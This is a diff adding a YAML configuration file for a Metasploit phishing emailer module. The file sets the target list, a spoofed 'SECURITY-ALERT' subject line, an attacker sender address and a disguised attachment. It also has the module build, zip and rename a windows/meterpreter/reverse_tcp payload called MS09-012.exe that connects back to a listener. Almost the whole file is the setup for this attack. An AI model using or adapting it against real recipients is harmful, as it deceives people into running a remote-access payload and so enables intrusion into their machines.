@@ -1,0 +1,52 @@
+# YAML:1.0
+# Configuration file for emailer.rb module
+# Taken from Jabra spl0it.org
+#
+# Emails CSV File (Fname Lname,email)
+to: /tmp/targets.csv
+# Email is sent from this address
+from: attacker@metasf.com
+# Subject
+subject: "[SECURITY-ALERT] Critical Windows Vulnerability"
+# Type ( text or text/html )
+type: text/html
+# Msg body file
+msg_file: /tmp/email_body.txt
+# Number of seconds to wait before next email
+wait: 5
+# Prepend the first name to the email body
+add_name: true
+# Add custom signature from file
+sig: true
+# Signature file
+sig_file: /tmp/sig.txt
+
+#### Attachment Information ####
+# Add an email attachment (File exploit anyone?) 
+attachment: true
+# Path to file attachment
+attachment_file: test.jpg
+# Name of file attachment
+attachment_file_name: msf.jpg
+# Type of attachment
+attachment_file_type: image/jpeg
+
+#### Metasploit/Payload Creation ####
+# create a metasploit payload
+make_payload: true
+# zip the payload 
+zip_payload: true
+# metasploit server ip
+msf_ip: 127.0.0.1
+# metasploit server port
+msf_port: 443
+# metasploit payload
+msf_payload: windows/meterpreter/reverse_tcp
+# metasploit payload
+msf_filename: MS09-012.exe
+# metasploit location
+msf_location: /pentest/exploits/framework3
+# change the extension
+msf_change_ext: true
+# new extension
+msf_payload_ext: vxe
